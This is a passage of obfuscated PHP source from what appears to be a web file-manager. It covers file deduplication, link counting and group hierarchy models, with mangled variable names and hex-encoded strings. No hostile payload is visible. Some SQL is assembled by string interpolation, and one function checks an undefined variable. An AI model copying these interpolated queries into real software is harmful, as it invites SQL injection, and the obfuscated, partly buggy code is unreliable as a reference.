substr($Ê·«Óà, 0, 5) : rand_string(5)); $ËÊšÑ– .= rand_string(3); $õ¡‹ˆ½ = $³ÖÂ›Ï  . $ì–é±¾“ . $ËÊšÑ–; if ($ Û·¦£) { $õ¡‹ˆ½ = $õ¡‹ˆ½ . $ïİß¢í[10] . $ Û·¦£; } } if (IO::isOsDriver($õ¡‹ˆ½) && !IO::isUploadServer($õ¡‹ˆ½)) { if (IO::exist($õ¡‹ˆ½)) { CacheLock::unlock($±Ûİ„¬Ü); return $õ¡‹ˆ½; } $„Âù´¼ = IO::setContent($õ¡‹ˆ½, $ïİß¢í[12]); if (!$„Âù´¼) { show_json($ïİß¢í[2242], !1); } } CacheLock::unlock($±Ûİ„¬Ü); break; case $ïİß¢í[943]: break; default: break; } return $õ¡‹ˆ½; } public function addFileByRemote($¨ƒÀ†í«, $üº¿ÜŒğ, $‰è¹ïÀô = array()) { $âò‘¢Ş =& $_SERVER[µÅ˜º…æ]; if (!IO::isFile($¨ƒÀ†í«)) { return !1; } $Ì–°å¯á = $‰è¹ïÀô[$âò‘¢Ş[563]] ? $‰è¹ïÀô[$âò‘¢Ş[563]] : $âò‘¢Ş[12]; $ÚãÀ¸¾ = IO::hashMd5($¨ƒÀ†í«, $Ì–°å¯á); $êÔó›¬‚ = KodIO::parse($¨ƒÀ†í«); $“²ÎŒ°Â = array($âò‘¢Ş[640] => IO::size($¨ƒÀ†í«), $âò‘¢Ş[2243] => 1, $âò‘¢Ş[509] => $üº¿ÜŒğ, $âò‘¢Ş[914] => $êÔó›¬‚[$âò‘¢Ş[487]], $âò‘¢Ş[510] => $¨ƒÀ†í«, $âò‘¢Ş[2244] => $‰è¹ïÀô[$âò‘¢Ş[694]] ? $‰è¹ïÀô[$âò‘¢Ş[694]] : IO::hashSimple($¨ƒÀ†í«), $âò‘¢Ş[2245] => $ÚãÀ¸¾ ? $ÚãÀ¸¾ : $Ì–°å¯á); if ($Ş®õ÷Ø = $this->addFileCheckExist($“²ÎŒ°Â[$âò‘¢Ş[694]], $“²ÎŒ°Â[$âò‘¢Ş[563]], $“²ÎŒ°Â[$âò‘¢Ş[79]])) { return $Ş®õ÷Ø; } return $this->addFileData($“²ÎŒ°Â); } private function addFileData($°ìÄí¤Ë) { $»ü•î•„ =& $_SERVER[µÅ˜º…æ]; if (!$°ìÄí¤Ë) { return !1; } if (!IO::isFile($°ìÄí¤Ë[$»ü•î•„[87]])) { return !1; } $°ìÄí¤Ë[$»ü•î•„[79]] = intval($°ìÄí¤Ë[$»ü•î•„[79]]); if (!$°ìÄí¤Ë[$»ü•î•„[79]] && strlen($°ìÄí¤Ë[$»ü•î•„[694]]) > 32) { $°ìÄí¤Ë[$»ü•î•„[79]] = intval(substr($°ìÄí¤Ë[$»ü•î•„[694]], 32)); } $¡¥¼ÕØŞ = $this->add($°ìÄí¤Ë); return $this->find($¡¥¼ÕØŞ); } public function addFile($ñë©Ï‡, $¸“†“™ø, $ç™­Êêö, $ª—àöõÂ = false) { $ßıñÛ… =& $_SERVER[µÅ˜º…æ]; $’±æûüÑ = IO::hashSimple($ñë©Ï‡); $¤Îß„èÉ = IO::size($ñë©Ï‡); $¼âç™‘ = $¤Îß„èÉ <= 1024 * 1024 * 10 ? IO::hashMd5($ñë©Ï‡) : $ßıñÛ…[12]; $ñ´„½ûÀ = $ßıñÛ…[2246] . $’±æûüÑ; CacheLock::lock($ñ´„½ûÀ); if ($¼âç™‘ && $’±æûüÑ) { $…ó¸â = $this->addFileCheckExist($’±æûüÑ, $¼âç™‘, $¤Îß„èÉ); if ($…ó¸â) { CacheLock::unlock($ñ´„½ûÀ); return $…ó¸â; } } $ıî©³Œ„ = $this->addFileMake($ñë©Ï‡, $¸“†“™ø, $¤Îß„èÉ, $’±æûüÑ, $¼âç™‘, $ç™­Êêö, $ª—àöõÂ); $İ¶êì¯ = $this->addFileData($ıî©³Œ„); if (!$İ¶êì¯) { return !1; } CacheLock::unlock($ñ´„½ûÀ); if (!$¼âç™‘ && $İ¶êì¯) { $this->fileMd5Check($İ¶êì¯); } return $İ¶êì¯; } public function fileMd5Check($·áŒ¤û) { $ş‹¼ñ” =& $_SERVER[µÅ˜º…æ]; $¤ùÛÁÄ = array($·áŒ¤û[$ş‹¼ñ”[557]], $·áŒ¤û[$ş‹¼ñ”[87]]); $‚´ ¢š = $ş‹¼ñ”[2247] . $·áŒ¤û[$ş‹¼ñ”[87]]; $ÈÚÆ¢Ô· = $ş‹¼ñ”[2248] . $·áŒ¤û[$ş‹¼ñ”[557]]; TaskQueue::add($ş‹¼ñ”[2249], $¤ùÛÁÄ, $‚´ ¢š, $ÈÚÆ¢Ô·); } public function fileMd5Set($•Úß‘¤Š, $¾µ¨’Õ) { $ÙÙïÓ¬ =& $_SERVER[µÅ˜º…æ]; $ÕÇüç€Ù = $this->find($•Úß‘¤Š); if (!$ÕÇüç€Ù || $ÕÇüç€Ù[$ÙÙïÓ¬[563]]) { return; } $öêú´Óæ = IO::hashMd5($¾µ¨’Õ); if (!$öêú´Óæ) { return $ÙÙïÓ¬[12]; } $this->where(array($ÙÙïÓ¬[557] => $•Úß‘¤Š))->save(array($ÙÙïÓ¬[563] => $öêú´Óæ)); } public function addFileMake($šŒ´İ’¯, $¼ÅÑ…ª‘, $¸ØÓûõº, $ªññô—, $ˆ°·ÛìÂ, $Ô½ÆÍ¹Ù, $€øùÛ¡…) { $Ñ§©ßó– =& $_SERVER[µÅ˜º…æ]; $Ê°Å¼µâ = $this->createFileName($Ô½ÆÍ¹Ù, $¼ÅÑ…ª‘, $ªññô—, $ˆ°·ÛìÂ); $Š‚äÂĞÃ = get_path_father($Ê°Å¼µâ); $Ïºù±ÄÓ = get_path_this($Ê°Å¼µâ); if ($€øùÛ¡…) { $Êôâ±Ÿû = IO::move($šŒ´İ’¯, $Š‚äÂĞÃ, !1, $Ïºù±ÄÓ); } else { $Êôâ±Ÿû = IO::copy($šŒ´İ’¯, $Š‚äÂĞÃ, !1, $Ïºù±ÄÓ); } if (!$Êôâ±Ÿû) { return !1; } $ûÚõü’š = IO::init($Êôâ±Ÿû); $ûÚõü’š->cacheMethod($Ñ§©ßó–[179], $ûÚõü’š->path, $Ñ§©ßó–[176]); if (IO::size($Êôâ±Ÿû) != $¸ØÓûõº) { return !1; } $ËÙÖïö° = array($Ñ§©ßó–[640] => $¸ØÓûõº, $Ñ§©ßó–[2243] => 1, $Ñ§©ßó–[509] => $Ô½ÆÍ¹Ù, $Ñ§©ßó–[914] => $¼ÅÑ…ª‘[$Ñ§©ßó–[487]], $Ñ§©ßó–[510] => $Ê°Å¼µâ, $Ñ§©ßó–[2244] => $ªññô—, $Ñ§©ßó–[2245] => $ˆ°·ÛìÂ); return $ËÙÖïö°; } public function addFileCheckExist($–ó‡’šª, $Şïı£¿Œ, $ÓÛ‰ä‰) { $úë¨ß§ =& $_SERVER[µÅ˜º…æ]; $ö­Ø‹¸ = $this->findByHash($–ó‡’šª, $Şïı£¿Œ); if (!$ö­Ø‹¸) { return !1; } $ÆĞ’¿ = array($úë¨ß§[2243] => intval($ö­Ø‹¸[$úë¨ß§[2250]]) + 1, $úë¨ß§[640] => $ÓÛ‰ä‰); $this->where(array($úë¨ß§[558] => $ö­Ø‹¸[$úë¨ß§[557]]))->save($ÆĞ’¿); return $ö­Ø‹¸; } public function remove($ö¤·ûÕü) { $this->linkCountChange($ö¤·ûÕü, !1); $this->clearEmpty(); return !0; } public function linkAdd($«Ø‰éÀË) { $this->linkCountChange($«Ø‰éÀË, !0); } public function linkCountChange($ƒÙè¹‚, $®øÏÆÏè) { $äŞÅğßû =& $_SERVER[µÅ˜º…æ]; if (!$ƒÙè¹‚) { return; } if (!is_array($ƒÙè¹‚)) { $ƒÙè¹‚ = array($ƒÙè¹‚); } $ÜÕ±àª² = array(); foreach ($ƒÙè¹‚ as $³ãÈ…Ü ) { $ÑÅÙØüÖ = $³ãÈ…Ü  . $äŞÅğßû[12]; if (!$ÜÕ±àª²[$ÑÅÙØüÖ]) { $ÜÕ±àª²[$ÑÅÙØüÖ] = 0; } $ÜÕ±àª²[$ÑÅÙØüÖ]++; } $’§Ó«¬ = array(); foreach ($ÜÕ±àª² as $³ãÈ…Ü  => $àØ²¨«·) { $ÑÅÙØüÖ = $àØ²¨«· . $äŞÅğßû[12]; if (!$’§Ó«¬[$ÑÅÙØüÖ]) { $’§Ó«¬[$ÑÅÙØüÖ] = array(); } $’§Ó«¬[$ÑÅÙØüÖ][] = $³ãÈ…Ü ; } foreach ($’§Ó«¬ as $àØ²¨«· => $Ú´ÊÒãÓ) { if (!$Ú´ÊÒãÓ) { continue; } $àØ²¨«· = $®øÏÆÏè ? $àØ²¨«· : -intval($àØ²¨«·); $Œ‹ã¤„ = array($äŞÅğßû[557] => array($äŞÅğßû[7], $Ú´ÊÒãÓ)); if ($àØ²¨«· < 0) { $Œ‹ã¤„[$äŞÅğßû[2250]] = array($äŞÅğßû[1184], abs($àØ²¨«·)); } $this->where($Œ‹ã¤„)->setAdd($äŞÅğßû[2250], $àØ²¨«·); } } public function findByHash($Ñ…•š¢Ş, $ ¼»™œï = false) { $­ä¨é¢ =& $_SERVER[µÅ˜º…æ]; if (!$Ñ…•š¢Ş && !$ ¼»™œï) { return !1; } $–ÔÈ·ú = array($­ä¨é¢[2244] => $Ñ…•š¢Ş); if ($ ¼»™œï) { $–ÔÈ·ú = array($­ä¨é¢[2245] => $ ¼»™œï); } return $this->order($­ä¨é¢[2251])->where($–ÔÈ·ú)->find(); } public function clearEmpty($°÷ô¢Í = 1) { $¤ãÖÕ¾ =& $_SERVER[µÅ˜º…æ]; $¢ŞÖøùÛ = time() - 3600 * 24 * $°÷ô¢Í; $Ø¾ò©Ñ = $¤ãÖÕ¾[2252] . $¢ŞÖøùÛ; $†²ó” = $this->where($Ø¾ò©Ñ)->select(); if (!$†²ó”) { return; } $†óÍŸÛ = new Task($¤ãÖÕ¾[2253], $¤ãÖÕ¾[12], count($†²ó”)); foreach ($†²ó” as $•²É„³ñ) { $†óÍŸÛ->update(1); $this->resetFile($•²É„³ñ); } $†óÍŸÛ->end(); } public function resetFile($ ÂûÂ) { $ÆâÇŠÊê =& $_SERVER[µÅ˜º…æ]; $øß†ø¢Ê = array($ÆâÇŠÊê[558] => $ ÂûÂ[$ÆâÇŠÊê[557]]); $–ı¡¥Í = Model($ÆâÇŠÊê[1534])->where($øß†ø¢Ê)->count(); $ÔÜàóû = Model($ÆâÇŠÊê[2254])->where($øß†ø¢Ê)->count(); $ˆ¢ß‚ù” = intval($–ı¡¥Í) + intval($ÔÜàóû); if ($ˆ¢ß‚ù” == 0) { Model($ÆâÇŠÊê[2255])->delete($ ÂûÂ[$ÆâÇŠÊê[557]]); $this->where($øß†ø¢Ê)->delete(); $this->metaSet($ ÂûÂ[$ÆâÇŠÊê[557]], null, null); if (!IO::isFile($ ÂûÂ[$ÆâÇŠÊê[87]])) { write_log(array($ÆâÇŠÊê[2256], ACTION, $ ÂûÂ), $ÆâÇŠÊê[1372]); return !1; } IO::remove($ ÂûÂ[$ÆâÇŠÊê[87]]); write_log(ACTION . $ÆâÇŠÊê[985] . KodUser::id() . $ÆâÇŠÊê[2257] . $ ÂûÂ[$ÆâÇŠÊê[557]] . $ÆâÇŠÊê[2044] . $ ÂûÂ[$ÆâÇŠÊê[79]] . $ÆâÇŠÊê[199] . $ ÂûÂ[$ÆâÇŠÊê[87]], $ÆâÇŠÊê[2256]); return; } if ($ ÂûÂ[$ÆâÇŠÊê[2250]] != $ˆ¢ß‚ù”) { $this->where($øß†ø¢Ê)->save(array($ÆâÇŠÊê[2243] => $ˆ¢ß‚ù”)); } } public function storageInfo($£Ù ‰ ş = false) { $®©ºêÅÜ =& $_SERVER[µÅ˜º…æ]; $¢¨ááî = $this->count() + 0.0; $î·‹™á¾ = 0; $åŸŒÜÚÈ = 1; $£©²ø² = 0; $¢Õ¨à¬ = 5000; for ($è¤ÅÍÑö = 0; $è¤ÅÍÑö < $¢¨ááî; $è¤ÅÍÑö = $è¤ÅÍÑö + $¢Õ¨à¬) { $¿÷äóÖ¾ = $this->limit($è¤ÅÍÑö, $¢Õ¨à¬)->select(); foreach ($¿÷äóÖ¾ as $ò›¥¢€) { $åŸŒÜÚÈ += $ò›¥¢€[$®©ºêÅÜ[79]] * $ò›¥¢€[$®©ºêÅÜ[2250]]; $î·‹™á¾ += $ò›¥¢€[$®©ºêÅÜ[79]] * ($ò›¥¢€[$®©ºêÅÜ[2250]] - 1); $£©²ø² += $ò›¥¢€[$®©ºêÅÜ[2250]]; } } $äÁÖ´º° = array($®©ºêÅÜ[2258] => $åŸŒÜÚÈ, $®©ºêÅÜ[2259] => $î·‹™á¾, $®©ºêÅÜ[2260] => $î·‹™á¾ / $åŸŒÜÚÈ, $®©ºêÅÜ[83] => $¢¨ááî, $®©ºêÅÜ[2261] => $£©²ø²); return $äÁÖ´º°; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\145" => "\x67\x72\157\165\x70\x5f\155\x65\x74\x61", "\x6d\145\164\x61\x46\151\145\x6c\144" => "\147\x72\x6f\x75\160\111\x44"); protected function cacheFunctionAlias($ Ñ²‰Éæ) { $Èºá¤«Õ =& $_SERVER[µÅ˜º…æ]; return array($Èºá¤«Õ[2262] => array($ Ñ²‰Éæ[0], $Èºá¤«Õ[2263]), $Èºá¤«Õ[2264] => array($ Ñ²‰Éæ[0], $Èºá¤«Õ[2265])); } protected function ___getInfo($öì†Ö¯×) { $öá·£Œ‘ = $this->getInfoSimple($öì†Ö¯×); if (!$öá·£Œ‘) { return !1; } return $this->_listDataApplyItem($öá·£Œ‘); } protected function ___getInfoSimple($Ô¢¸½ƒÛ) { $Î´Âş®½ = array($_SERVER[µÅ˜º…æ][1496] => intval($Ô¢¸½ƒÛ)); $¯îŠ…»¼ = $this->where($Î´Âş®½)->find(); return is_array($¯îŠ…»¼) ? $¯îŠ…»¼ : array(); } protected function groupAdd($“åãªí) { $·©ö¨† =& $_SERVER[µÅ˜º…æ]; if (!$“åãªí[$·©ö¨†[190]] && isset($“åãªí[$·©ö¨†[1496]]) && $“åãªí[$·©ö¨†[1496]] == 1) { if ($øĞ»Î« = $this->getInfoSimple($“åãªí[$·©ö¨†[1496]], !0)) { return $“åãªí[$·©ö¨†[1496]]; } } else { $øĞ»Î« = $this->getInfoSimple($“åãªí[$·©ö¨†[190]]); if (!$øĞ»Î«) { return !1; } } $ˆ§Á²” = $·©ö¨†[613]; if ($øĞ»Î«[$·©ö¨†[604]]) { $ˆ§Á²” = $øĞ»Î«[$·©ö¨†[604]] . $øĞ»Î«[$·©ö¨†[1496]] . $·©ö¨†[50]; } $şß–€ôâ = array($·©ö¨†[509] => $this->groupNameAuto($“åãªí[$·©ö¨†[190]], $“åãªí[$·©ö¨†[32]]), $·©ö¨†[492] => $“åãªí[$·©ö¨†[190]], $·©ö¨†[674] => $ˆ§Á²”, $·©ö¨†[2266] => $“åãªí[$·©ö¨†[2167]], $·©ö¨†[2267] => 0, $·©ö¨†[2185] => 0); $“åãªí[$·©ö¨†[32]] = $şß–€ôâ[$·©ö¨†[32]]; if (isset($“åãªí[$·©ö¨†[2203]])) { $şß–€ôâ[$·©ö¨†[2203]] = $“åãªí[$·©ö¨†[2203]]; } else { $ÙïÆÄ˜Î = $this->max($·©ö¨†[2203]); if (!$ÙïÆÄ˜Î) { $ÙïÆÄ˜Î = 0; } $şß–€ôâ[$·©ö¨†[2203]] = $ÙïÆÄ˜Î + 1; } if (!empty($“åãªí[$·©ö¨†[1496]])) { $şß–€ôâ[$·©ö¨†[1496]] = $“åãªí[$·©ö¨†[1496]]; } $î›õÌ´Ô = $this->add($şß–€ôâ); $this->groupMetaEdit($î›õÌ´Ô, $“åãªí); Model($·©ö¨†[1534])->groupRootAdd($î›õÌ´Ô); $this->_clearCache($“åãªí[$·©ö¨†[190]]); return $î›õÌ´Ô; } protected function groupEdit($åã¨È„‚, $äï¶†Œï) { $¾ÃÍƒ¦Ø =& $_SERVER[µÅ˜º…æ]; $‹Ü ÅÔ¸ = $this->getInfoSimple($åã¨È„‚); if (!$‹Ü ÅÔ¸) { return !1; } if (!empty($äï¶†Œï[$¾ÃÍƒ¦Ø[190]])) { $ÀÜÌÓÀš = $this->getInfoSimple($äï¶†Œï[$¾ÃÍƒ¦Ø[190]]); if (!$ÀÜÌÓÀš) { return !1; } if ($‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[1496]] == $ÀÜÌÓÀš[$¾ÃÍƒ¦Ø[1496]]) { return !1; } if ($äï¶†Œï[$¾ÃÍƒ¦Ø[190]] != $‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[190]]) { if ($ÀÜÌÓÀš[$¾ÃÍƒ¦Ø[604]] !== $‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[604]] && strpos($ÀÜÌÓÀš[$¾ÃÍƒ¦Ø[604]], $‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[604]] . $‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[1496]] . $¾ÃÍƒ¦Ø[50]) === 0) { return !1; } $äï¶†Œï[$¾ÃÍƒ¦Ø[674]] = $ÀÜÌÓÀš[$¾ÃÍƒ¦Ø[604]] . $äï¶†Œï[$¾ÃÍƒ¦Ø[190]] . $¾ÃÍƒ¦Ø[50]; $this->_changeChildLevel($‹Ü ÅÔ¸, $ÀÜÌÓÀš); $this->_clearCache($ÀÜÌÓÀš[$¾ÃÍƒ¦Ø[1496]]); $this->_clearCache($‹Ü ÅÔ¸[$¾ÃÍƒ¦Ø[190]]); } } $this->groupMetaEdit($åã¨È„‚, $äï¶†Œï); $this->_clearChildrenCache($‹Ü ÅÔ¸); return $this->where(array($¾ÃÍƒ¦Ø[2268] => $åã¨È„‚))->save($äï¶†Œï); } private function groupMetaEdit($ıÆ–ù‘‘, &$…¨µ¯†) { $×ÙÍ¯Šç =& $_SERVER[µÅ˜º…æ]; if (isset($…¨µ¯†[$×ÙÍ¯Šç[32]])) { $this->setNamePinyin($ıÆ–ù‘‘, $…¨µ¯†[$×ÙÍ¯Šç[32]]); } if (isset($…¨µ¯†[$×ÙÍ¯Šç[2269]])) { $ÜĞÛ°„‹ = array($×ÙÍ¯Šç[2269] => $…¨µ¯†[$×ÙÍ¯Šç[2269]], $×ÙÍ¯Šç[2270] => $…¨µ¯†[$×ÙÍ¯Šç[2270]]); unset($…¨µ¯†[$×ÙÍ¯Šç[2269]]); unset($…¨µ¯†[$×ÙÍ¯Šç[2270]]); if (isset($…¨µ¯†[$×ÙÍ¯Šç[2271]])) { $æèÏ›„ = $×ÙÍ¯Šç[1492] . $ıÆ–ù‘‘; $Ìİ¤°¹Ì = $×ÙÍ¯Šç[1491]; $òôÆ¾ = $…¨µ¯†[$×ÙÍ¯Šç[2271]] ? $…¨µ¯†[$×ÙÍ¯Šç[2271]] : $×ÙÍ¯Šç[12]; $ËÆëÎú¿ = Model($×ÙÍ¯Šç[1490])->get($æèÏ›„, $Ìİ¤°¹Ì); $ËÆëÎú¿ = $ËÆëÎú¿ ? $ËÆëÎú¿ : $×ÙÍ¯Šç[12]; if ($ËÆëÎú¿ != $òôÆ¾) { if (!$òôÆ¾ && $ËÆëÎú¿) { Model($×ÙÍ¯Šç[1490])->remove($æèÏ›„, $Ìİ¤°¹Ì); } else { if ($òôÆ¾) { Model($×ÙÍ¯Šç[1490])->set($æèÏ›„, $òôÆ¾, $Ìİ¤°¹Ì); } } } $ÜĞÛ°„‹[$×ÙÍ¯Šç[2271]] = $òôÆ¾; } $this->metaSet($ıÆ–ù‘‘, $ÜĞÛ°„‹); } } private function _clearChildrenCache($’™á°§£) { $”˜¹×ıê =& $_SERVER[µÅ˜º…æ]; $ë¯ËÃ¸ = array($”˜¹×ıê[674] => array($”˜¹×ıê[635], $’™á°§£[$”˜¹×ıê[604]] . $’™á°§£[$”˜¹×ıê[1496]] . $”˜¹×ıê[636])); $È´âñÃ¡ = $this->field($”˜¹×ıê[1496])->where($ë¯ËÃ¸)->select(); foreach ($È´âñÃ¡ as $í’àùšˆ) { $this->_clearCache($í’àùšˆ[$”˜¹×ıê[1496]]); } } private function _clearCache($ºœÂÈ›) { $îÁü‘ì¸ =& $_SERVER[µÅ˜º…æ]; $this->cacheFunctionClear($îÁü‘ì¸[2272], $ºœÂÈ›); $this->cacheFunctionClear($îÁü‘ì¸[2273], $ºœÂÈ›); } private function _changeChildLevel($°ÚÔ‹ª¿, $Äæ¼ˆÑÅ, $¢ğÓ“Œ = false) { $‘Ä¹§îÛ =& $_SERVER[µÅ˜º…æ]; $”åÛş«Ã = $°ÚÔ‹ª¿[$‘Ä¹§îÛ[604]] . $°ÚÔ‹ª¿[$‘Ä¹§îÛ[1496]] . $‘Ä¹§îÛ[50]; $é€åÜÆ = $Äæ¼ˆÑÅ[$‘Ä¹§îÛ[604]] . $Äæ¼ˆÑÅ[$‘Ä¹§îÛ[1496]] . $‘Ä¹§îÛ[50] . $°ÚÔ‹ª¿[$‘Ä¹§îÛ[1496]] . $‘Ä¹§îÛ[50]; if ($¢ğÓ“Œ) { $é€åÜÆ = $Äæ¼ˆÑÅ[$‘Ä¹§îÛ[604]] . $Äæ¼ˆÑÅ[$‘Ä¹§îÛ[1496]] . $‘Ä¹§îÛ[50]; } $âÄ“åÍ = array($‘Ä¹§îÛ[674] => array($‘Ä¹§îÛ[635], $°ÚÔ‹ª¿[$‘Ä¹§îÛ[604]] . $°ÚÔ‹ª¿[$‘Ä¹§îÛ[1496]] . $‘Ä¹§îÛ[636])); $ŸÅ“Éğ§ = array($‘Ä¹§îÛ[674] => array($‘Ä¹§îÛ[683], "\162\145\160\x6c\x61\143\145\50\160\141\162\145\156\164\114\145\166\145\x6c\54\x27{$”åÛş«Ã}\x27\54\x27{$é€åÜÆ}\x27\51")); $this->_clearChildrenCache($°ÚÔ‹ª¿); $this->where($âÄ“åÍ)->data($ŸÅ“Éğ§)->save(); } public function setNamePinyin($ ±‘“ãà, $ñ—÷ì×’ = false) { $•ãÔÄÓ£ =& $_SERVER[µÅ˜º…æ]; if (!$ñ—÷ì×’) { $°ª–™Ïñ = $this->getInfoSimple($ ±‘“ãà); $ñ—÷ì×’ = $°ª–™Ïñ[$•ãÔÄÓ£[32]]; } if (!Input::check($ñ—÷ì×’, $•ãÔÄÓ£[677])) { $this->metaSet($ ±‘“ãà, $•ãÔÄÓ£[552], null); $this->metaSet($ ±‘“ãà, $•ãÔÄÓ£[551], null); return; } $†äÜ¼¸ = array($•ãÔÄÓ£[552] => str_replace($•ãÔÄÓ£[53], $•ãÔÄÓ£[12], Pinyin::get($ñ—÷ì×’)), $•ãÔÄÓ£[551] => Pinyin::get($ñ—÷ì×’, $•ãÔÄÓ£[678])); $this->metaSet($ ±‘“ãà, $†äÜ¼¸); } protected function metaSet($à€Àß¡ƒ, $é£¢©‰˜ = null, $™âŞÑÜ¤ = null) { $this->_clearCache($à€Àß¡ƒ); return parent::metaSet($à€Àß¡ƒ, $é£¢©‰˜, $™âŞÑÜ¤); } protected function groupStatus($û½”äæ¸, $ú½âèš) { $©Ù¼ŠÔ =& $_SERVER[µÅ˜º…æ]; $äô“Î‚§ = $this->getInfoSimple($û½”äæ¸); if (!$äô“Î‚§) { return !1; } $this->_clearCache($û½”äæ¸); return $this->metaSet($û½”äæ¸, $©Ù¼ŠÔ[849], $ú½âèš); if ($ú½âèš == $©Ù¼ŠÔ[91]) { $°¶õœ° = $this->parentLevelArray($äô“Î‚§[$©Ù¼ŠÔ[604]]); } else { } $°¶õœ°[] = $äô“Î‚§[$©Ù¼ŠÔ[1496]]; $³ÑÀÔä– = array(); foreach ($°¶õœ° as $û½”äæ¸) { $³ÑÀÔä–[] = array($©Ù¼ŠÔ[1496] => $û½”äæ¸, $©Ù¼ŠÔ[95] => $©Ù¼ŠÔ[849], $©Ù¼ŠÔ[451] => $ú½âèš); $this->_clearCache($û½”äæ¸); } return Model($©Ù¼ŠÔ[2274])->addAll($³ÑÀÔä–, array(), !0); } protected function groupRemove($ü©ˆş»‹, $à÷©äıó = false) { $Ñ ¼Õ¡ı =& $_SERVER[µÅ˜º…æ]; $Ôê·´ê = array($Ñ ¼Õ¡ı[1496] => $ü©ˆş»‹); $­ÔİßŒœ = $this->where($Ôê·´ê)->find(); if (!$­ÔİßŒœ || $­ÔİßŒœ[$Ñ ¼Õ¡ı[190]] == 0) { return !1; } if (!$à÷©äıó) { $Îş÷¾¦ƒ = $this->getInfoSimple($­ÔİßŒœ[$Ñ ¼Õ¡ı[190]]); $this->_changeChildLevel($­ÔİßŒœ, $Îş÷¾¦ƒ, !0); $this->where(array($Ñ ¼Õ¡ı[190] => $ü©ˆş»‹))->save(array($Ñ ¼Õ¡ı[190] => $­ÔİßŒœ[$Ñ ¼Õ¡ı[190]])); $this->_clearCache($Îş÷¾¦ƒ[$Ñ ¼Õ¡ı[1496]]); } Model($Ñ ¼Õ¡ı[2274])->where($Ôê·´ê)->delete(); Model($Ñ ¼Õ¡ı[2275])->where($Ôê·´ê)->delete(); Model($Ñ ¼Õ¡ı[932])->groupRootRemove($ü©ˆş»‹); $this->_clearCache($­ÔİßŒœ[$Ñ ¼Õ¡ı[190]]); return $this->where($Ôê·´ê)->delete(); } protected function groupSort($ãÇùü„) { $âç˜É¸Ã =& $_SERVER[µÅ˜º…æ]; $ÚÊ¥ÆÆ = array(); foreach ($ãÇùü„ as $ºÒ¥”Ó => $Ğ«•‘õî) { $ÚÊ¥ÆÆ[] = array($âç˜É¸Ã[1496], $Ğ«•‘õî, $âç˜É¸Ã[2203], $ºÒ¥”Ó + 1); } $this->saveAll($ÚÊ¥ÆÆ); } public function listData() { $ÊñÔœà = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÊñÔœà[$_SERVER[µÅ˜º…æ][446]]); return $ÊñÔœà; } private function _makeOrder($Åìñ¼½ª = '') { $Àùİ€Ğ” =& $_SERVER[µÅ˜º…æ]; $Ç¾‹·®³ = array($Àùİ€Ğ”[1496], $Àùİ€Ğ”[32], $Àùİ€Ğ”[2169], $Àùİ€Ğ”[231]); $¸ÙÅ¬İ = array($Àùİ€Ğ”[537] => $Àùİ€Ğ”[538], $Àùİ€Ğ”[539] => $Àùİ€Ğ”[540]); $äûªô¶Ù = Input::get($Àùİ€Ğ”[544], $Àùİ€Ğ”[7], $Àùİ€Ğ”[2185], $Ç¾‹·®³); $Ş¡Ôìƒ¸ = Input::get($Àùİ€Ğ”[545], $Àùİ€Ğ”[7], $Àùİ€Ğ”[2276], array($Àùİ€Ğ”[2276], $Àùİ€Ğ”[539])); $Ş¡Ôìƒ¸ = $¸ÙÅ¬İ[$Ş¡Ôìƒ¸]; $Åìñ¼½ª = $Åìñ¼½ª . "{$äûªô¶Ù}\x20{$Ş¡Ôìƒ¸}\54\40\147\162\x6f\165\160\x49\104\x20\x61\163\x63"; return $this->order($Åìñ¼½ª); } public function listChild($–îìÃË) { $€áÕ¬•Æ =& $_SERVER[µÅ˜º…æ]; $®Š€±ˆ› = $this->where(array($€áÕ¬•Æ[190] => $–îìÃË))->_makeOrder()->selectPage(200); $this->_listDataApply($®Š€±ˆ›[$€áÕ¬•Æ[446]]); return $®Š€±ˆ›; } public function listChildIds($Şîœç¼õ) { $®¤÷ñË =& $_SERVER[µÅ˜º…æ]; if (is_string($–‡óÄ)) { $Şîœç¼õ = explode($®¤÷ñË[50], $Şîœç¼õ); } $ï«È‡Ş = $this->where(array($®¤÷ñË[1496] => array($®¤÷ñË[7], $Şîœç¼õ)))->field($®¤÷ñË[2277])->select(); if (!$ï«È‡Ş) { return !1; } $ÓÎôí = array(); foreach ($ï«È‡Ş as $—ÔËÕòú) { $ÓÎôí[] = "\x73\145\154\x65\x63\164\40\x67\162\157\x75\x70\x49\x44\40\146\x72\157\155\x20\x60\147\x72\157\x75\x70\x60\40\167\150\145\162\x65\40\x70\x61\162\145\x6e\164\114\145\x76\x65\x6c\x20\x6c\x69\x6b\145\40\47{$—ÔËÕòú[$®¤÷ñË[604]]}{$—ÔËÕòú[$®¤÷ñË[1496]]}\x2c\45\47"; } $ÓÎôí = implode($®¤÷ñË[2278], $ÓÎôí); $ï«È‡Ş = $this->query($ÓÎôí); if (!$ï«È‡Ş) { return array(); } $Şîœç¼õ = array_to_keyvalue($ï«È‡Ş, $®¤÷ñË[12], $®¤÷ñË[1496]); return array_unique($Şîœç¼õ); } public function listByID($ù±£µà) { $Ôß„´”Š =& $_SERVER[µÅ˜º…æ]; if (!$ù±£µà) { return array(); } $óƒ€¦¦† = array($Ôß„´”Š[1496] => array($Ôß„´”Š[7], $ù±£µà)); $¬àÊ’·à = $this->where($óƒ€¦¦†)->select(); $¬àÊ’·à = array_sort_keep($¬àÊ’·à, $Ôß„´”Š[1496], $ù±£µà); $this->_listDataApply($¬àÊ’·à); return $¬àÊ’·à; } public function listSearch($Çº¨) { $ªî´•­ =& $_SERVER[µÅ˜º…æ]; $í³Œ‘±§ = trim($Çº¨[$ªî´•­[2279]]); $ß»‡‘¥ò = explode($ªî´•­[53], $í³Œ‘±§); if (!$í³Œ‘±§ || count($ß»‡‘¥ò) == 1) { return $this->listSearchNow($Çº¨); } $ğß²ï£¼ = array($ªî´•­[446] => array()); foreach ($ß»‡‘¥ò as $ğŠò¯) { if (!trim($ğŠò¯)) { continue; } $Çº¨[$ªî´•­[2279]] = $ğŠò¯; $–€®ş„ = $this->listSearchNow($Çº¨); $ğß²ï£¼[$ªî´•­[446]] = array_merge($ğß²ï£¼[$ªî´•­[446]], $–€®ş„[$ªî´•­[446]]); } 